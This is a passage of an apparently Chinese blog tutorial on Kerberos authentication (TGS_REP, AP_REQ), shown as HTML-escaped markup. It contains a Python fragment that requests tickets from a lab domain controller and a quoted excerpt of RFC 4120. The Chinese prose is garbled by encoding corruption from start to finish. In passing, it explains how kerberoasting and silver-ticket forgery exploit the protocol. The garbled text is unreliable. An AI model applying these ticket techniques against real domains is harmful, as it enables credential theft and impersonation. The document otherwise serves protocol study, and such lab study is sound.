&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;172.16.0.106&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;recv_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;as_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_rep_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt_as_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tgt_a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ticket&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;subkey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;generate_subkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;nonce&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;current_time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pac&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;session_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;as_rep_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;keytype&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]),&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;as_rep_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;keyvalue&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tgs_req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build_tgs_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_realm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;MSSQLSvc&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SQL.hack.lab&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_realm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            &lt;span class=&#34;n&#34;&gt;tgt_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;subkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;current_time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pac_request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sock1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tgs_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;172.16.0.106&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;recv_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tgs_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tgs_rep_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt_tgs_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;subkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tgs_rep&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å»ºè®®å¤§å®¶ä¹Ÿå»è·Ÿä¸€ä¸‹è¿™éƒ¨åˆ†çš„ä»£ç ï¼Œå¯ä»¥è®¤è¯†åˆ°æ•´è¿‡æ•°æ®åŒ…è¯¦ç»†çš„ç»„åˆæµç¨‹æ­¥éª¤ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœMSSQLSvcå’ŒSQL.hack.labä¸å­˜åœ¨å¯ä»¥æ¢æˆä½ ç™»å½•çš„é‚£å°ä¸»æœºåç§°æ¯”å¦‚æœ¬æ¬¡ç¯å¢ƒä¸­ä¸»æœºåç§°win7.hack.lab,æœåŠ¡ç±»å‹å°±æ¢æˆhostã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;tgs_rep&#34;&gt;TGS_REP&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;TGSæ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œé¦–å…ˆä¼šæ£€æŸ¥è‡ªèº«æ˜¯å¦å­˜åœ¨å®¢æˆ·ç«¯æ‰€è¯·æ±‚çš„æœåŠ¡ï¼ˆå°±æ˜¯æŸ¥è¯¢SPNï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¦‚æœæœåŠ¡å­˜åœ¨ï¼Œåˆ™é€šè¿‡ krbtgt ç”¨æˆ·çš„NTLM Hash è§£å¯†TGTå¹¶å¾—åˆ°Login Session Keyï¼Œç„¶åé€šè¿‡Login Session Keyè§£å¯†Authenticatorã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¦‚æœè§£å¯†æˆåŠŸï¼Œåˆ™éªŒè¯äº†å¯¹æ–¹çš„çœŸå®èº«ä»½ï¼ŒåŒæ—¶è¿˜ä¼šéªŒè¯æ—¶é—´æˆ³æ˜¯å¦åœ¨èŒƒå›´å†…ã€‚å¹¶ä¸”è¿˜ä¼šæ£€æŸ¥TGTä¸­çš„æ—¶é—´æˆ³æ˜¯å¦è¿‡æœŸï¼Œä¸”åŸå§‹åœ°å€æ˜¯å¦å’ŒTGTä¸­ä¿å­˜çš„åœ°å€ç›¸åŒã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åœ¨å®Œæˆä¸Šè¿°çš„æ£€æµ‹åï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™TGSå®Œæˆäº†å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ï¼Œä¼šç”Ÿæˆä¸€ä¸ªç”¨Logon Session KeyåŠ å¯†åçš„ç”¨äºç¡®ä¿å®¢æˆ·ç«¯-æœåŠ¡å™¨ä¹‹é—´é€šä¿¡å®‰å…¨çš„Service Session Keyä¼šè¯ç§˜é’¥(ä¹Ÿå°±æ˜¯æœ€å¤–å±‚enc-partéƒ¨åˆ†)ï¼Œå¹¶ä¸”ä¼šä¸ºè¯¥å®¢æˆ·ç«¯ç”ŸæˆSTæœåŠ¡ç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;STæœåŠ¡ç¥¨æ®ä¸»è¦åŒ…å«ä¸¤æ–¹é¢çš„å†…å®¹ï¼šå®¢æˆ·ç«¯ç”¨æˆ·ä¿¡æ¯å’ŒåŸå§‹Service Session Keyï¼Œæ•´ä¸ªSTæœåŠ¡ç¥¨æ®ç”¨è¯¥æœåŠ¡çš„NTLM Hashè¿›è¡ŒåŠ å¯†ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœ€ç»ˆService Session Key å’Œ STæœåŠ¡ç¥¨æ® å‘é€ç»™å®¢æˆ·ç«¯ã€‚(è¿™ä¸€æ­¥ä¸ç®¡ç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå°±éƒ½ä¼šè¿”å›STæœåŠ¡ç¥¨æ®ï¼Œè¿™ä¹Ÿæ˜¯kerberoastingèƒ½åˆ©ç”¨çš„åŸå› ï¼Œä»»ä½•ä¸€ä¸ªç”¨æˆ·ï¼Œåªè¦hashæ­£ç¡®ï¼Œå°±å¯ä»¥è¯·æ±‚åŸŸå†…ä»»ä½•ä¸€ä¸ªæœåŠ¡çš„STç¥¨æ®)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸‹é¢æ˜¯TGS_REPçš„æ•°æ®åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/tgs_rep.png&#34; alt=&#34;tgs_rep&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œä¸»è¦éœ€è¦äº†è§£çš„å°±æ˜¯&lt;strong&gt;ticket&lt;/strong&gt;å’Œ&lt;strong&gt;enc-part&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ticket&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè¿”å›çš„ticketå°±æ˜¯ä¸€å¼ ST(Service Ticket)æœåŠ¡ç¥¨æ®ï¼Œä¹Ÿç§°ä½œTGSç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;è¿™å¼ ç¥¨æ®çš„ticket-&amp;gt;enc-partéƒ¨åˆ†æ˜¯ä½¿ç”¨è¯·æ±‚çš„æœåŠ¡å¯¹åº”çš„å¯†é’¥(Service Session Key)è¿›è¡ŒåŠ å¯†çš„ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬æ‹¥æœ‰æœåŠ¡çš„å¯†ç Hashï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªSTæœåŠ¡ç¥¨æ®ï¼Œè¿™å°±é€ æˆäº†ç™½é“¶ç¥¨æ®æ”»å‡»ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;enc-part:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç»è¿‡&lt;code&gt;Logon Session Key&lt;/code&gt;åŠ å¯†çš„&lt;code&gt;Service Session Key&lt;/code&gt;ï¼ˆåŒ…å«è¯·æ±‚æœåŠ¡çš„èº«ä»½ä¿¡æ¯ç­‰ï¼‰ï¼Œç”¨äºè¯·æ±‚æœåŠ¡æ—¶çš„ä¼šè¯å¯†é’¥ã€‚enc-partè¿™é‡Œä¹Ÿæ˜¯å¯ä»¥è§£å¯†çš„ï¼Œè§£å¯†å¾—åˆ°&lt;code&gt;Service Session Key&lt;/code&gt;,ç”¨æ¥ä½œä¸ºä½œä¸ºä¸‹é˜¶æ®µçš„è®¤è¯å¯†é’¥ã€‚&lt;/p&gt;
&lt;p&gt;è§£å¯†å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„pythonä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tgs_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tgs_rep_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt_tgs_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;subkey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tgs_rep_enc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;kerberoastingå’Œkerberoastæ˜¯åŒä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œåªæ˜¯å«æ³•ä¸ä¸€æ ·&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;apè®¤è¯&#34;&gt;APè®¤è¯&lt;/h2&gt;
&lt;h3 id=&#34;ap_req&#34;&gt;AP_REQ&lt;/h3&gt;
&lt;p&gt;ä¸Šé¢çš„è¿‡ç¨‹æ˜¯å’ŒKDCäº¤äº’çš„æ­¥éª¤ï¼Œè¿™ä¸€æ­¥æ˜¯ç”¨æˆ·ä¸AP(Application Server)ä¹‹é—´çš„è®¤è¯ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æˆ‘ä»¬ä»TGS_REPæ‹¿åˆ°äº†STç¥¨æ®å’ŒService Session Key,æˆ‘ä»¬éœ€è¦å»è®¿é—®apçš„æœåŠ¡å†…å®¹ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ä»ä¸Šé¢æ‹¿åˆ°çš„STç¥¨æ®ï¼Œè¿˜æœ‰ç”¨æˆ·åã€æ—¶é—´æˆ³ã€Service Session Keyä¸€èµ·å‘é€ç»™APã€‚&lt;/li&gt;
&lt;li&gt;APæ”¶åˆ°åä¼šå»KDCç¡®è®¤ä¿¡æ¯å’ŒPACæƒé™&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸‹é¢æ˜¯AP_REQçš„æ•°æ®åŒ…ï¼Œå®ƒä¸ä¼šåƒTGSã€ASä¸€æ ·åœ¨Wiresharkä¸­æ˜¾ç¤ºï¼Œä¸€èˆ¬æ˜¯é€šè¿‡æœåŠ¡çš„åè®®ä¹Ÿå°±æ˜¯DCERPC(Distributed Computing Environment / Remote Procedure Calls),ä¹Ÿç§°ä½œ&lt;strong&gt;åˆ†æ•£å¼è¿ç®—ç¯å¢ƒ/è¿œç«¯å‘¼å«ç³»ç»Ÿ&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯å¦ä¸€ä¸ªéå¸¸åŸºç¡€çš„Windowsç³»ç»Ÿçš„é€šä¿¡åè®®ï¼Œå®ƒæ¯”rdpåè®®æ›´æ™®éï¼Œé»˜è®¤å¼€å¯ã€‚å®ƒä¼šæŠŠkerberosçš„è®¤è¯ä¿¡æ¯å°è£…èµ·æ¥ä¸€èµ·å‘é€ï¼Œæ¯”å¦‚ä½ ç”¨HTTPçš„kerberosåè®®è®¤è¯ä¹Ÿæ˜¯å°è£…åœ¨HTTPåè®®ä¸­ä¸€èµ·å‘é€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ¥çœ‹ä¸»è¦éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹rfcä¸Šé¢çš„ä»‹ç»ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Neuman, et al.              Standards Track                    [Page 84]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RFC 4120                      Kerberos V5                      July 2005
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   AP-REQ          ::= [APPLICATION 14] SEQUENCE {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           pvno            [0] INTEGER (5),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           msg-type        [1] INTEGER (14),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           ap-options      [2] APOptions,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           ticket          [3] Ticket,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           authenticator   [4] EncryptedData -- Authenticator
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   APOptions       ::= KerberosFlags
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           -- reserved(0),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           -- use-session-key(1),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           -- mutual-required(2)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   pvno and msg-type
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      These fields are described above in Section 5.4.1. msg-type is
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KRB_AP_REQ.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ap-options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field appears in the application request (KRB_AP_REQ) and
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      affects the way the request is processed.  It is a bit-field,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      where the selected options are indicated by the bit being set (1),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      and the unselected options and reserved fields by being reset (0).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      The encoding of the bits is specified in Section 5.2.  The
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      meanings of the options are as follows:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Bit(s)  Name             Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0       reserved         Reserved for future expansion of this field.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   1       use-session-key  The USE-SESSION-KEY option indicates that
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            the ticket the client is presenting to a
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            server is encrypted in the session key from
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            the server&amp;#39;s TGT.  When this option is not
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            specified, the ticket is encrypted in the
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            server&amp;#39;s secret key.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   2       mutual-required  The MUTUAL-REQUIRED option tells the server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            that the client requires mutual
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            authentication, and that it must respond
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                            with a KRB_AP_REP message.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   3-31    reserved         Reserved for future use.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ticket
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field is a ticket authenticating the client to the server.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡Œé¢çš„ticketå°±æ˜¯ä»TGS_REPè·å–åˆ°çš„STï¼ˆTGSï¼‰ç¥¨æ®ï¼Œä¸‹é¢è¿˜æœ‰ä½¿ç”¨Service Session KeyåŠ å¯†çš„authenticatorï¼Œå…³äºauthenticatorçš„ä»‹ç»ï¼š&lt;/p&gt;
